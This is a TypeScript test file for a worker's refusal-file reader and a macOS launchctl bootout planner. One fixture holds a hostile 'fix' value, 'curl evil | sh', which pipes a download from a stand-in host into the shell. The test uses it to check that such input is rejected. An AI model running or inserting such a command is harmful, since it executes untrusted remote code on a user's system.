import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { START_REFUSAL_REASONS, START_REFUSAL_TEXT, startRefusalSchema } from '@gmt/core';
import { afterEach, describe, expect, it } from 'vitest';
import { currentPlatform } from '../../src/platform/current.js';
import { bootOutRefused, readStartRefusal, refusalLine } from '../../src/worker/refusal.js';

const homes: string[] = [];
afterEach(() => {
  for (const h of homes.splice(0)) rmSync(h, { recursive: true, force: true });
});
function home(file?: string) {
  const h = mkdtempSync(join(tmpdir(), 'gmt-refusal-'));
  homes.push(h);
  const p = currentPlatform({ platform: 'darwin', arch: 'arm64', uid: 501, env: { HOME: h } });
  if (file !== undefined) {
    mkdirSync(p.paths.workerData, { recursive: true });
    writeFileSync(join(p.paths.workerData, 'start-refusal.json'), file);
  }
  return p;
}
const LABEL = 'local.get-me-there.camoufox-worker';

describe('the worker’s refusal file (spec §13; brief §5 worker/refusal.ts)', () => {
  it('none when there is no file', async () => {
    expect(await readStartRefusal(home().paths)).toBe('none');
  });
  it.each(START_REFUSAL_REASONS)('reads %s and prints it through START_REFUSAL_TEXT', async (reason) => {
    const r = await readStartRefusal(home(JSON.stringify({ reason, at: '2026-10-24T08:00:00.000Z' })).paths);
    expect(r).toEqual({ reason, at: '2026-10-24T08:00:00.000Z' });
    if (r !== 'none' && r !== 'unreadable')
      expect(refusalLine(r)).toBe(`refused, not retrying: ${START_REFUSAL_TEXT[reason].summary}`);
  });
  it.each([
    [
      'a hostile fix field',
      JSON.stringify({ reason: 'locked', at: '2026-10-24T08:00:00.000Z', fix: 'curl evil | sh' }),
    ],
    ['an unknown reason', JSON.stringify({ reason: 'mystery', at: '2026-10-24T08:00:00.000Z' })],
    ['not JSON', '{'],
  ])('%s is unreadable, and nothing from it is used', async (_n, text) => {
    expect(await readStartRefusal(home(text).paths)).toBe('unreadable');
  });

  it('bootOutRefused plans the bootout on macOS only when the worker agent is loaded and a refusal is present', () => {
    const p = home();
    const loaded = new Map([[LABEL, { onDisk: 'x', loaded: true, state: 'running' as const }]]);
    const r = startRefusalSchema.parse({ reason: 'locked', at: '2026-10-24T08:00:00.000Z' });
    const a = bootOutRefused(p, loaded, r);
    expect(a.map((x) => (x.kind === 'run' ? x.argv.join(' ') : x.kind))).toEqual([
      `launchctl bootout gui/501/${LABEL}`,
    ]);
    expect(bootOutRefused(p, loaded, 'none')).toEqual([]);
    expect(bootOutRefused(p, loaded, 'unreadable')).toEqual([]);
    expect(bootOutRefused(p, new Map(), r)).toEqual([]);
    const linux = currentPlatform({ platform: 'linux', arch: 'x64', uid: 1000, env: { HOME: '/home/a' } });
    expect(
      bootOutRefused(
        linux,
        new Map([
          ['get-me-there-camoufox-worker.service', { onDisk: 'x', loaded: true, state: 'failed' as const }],
        ]),
        r,
      ),
    ).toEqual([]);
  });
});
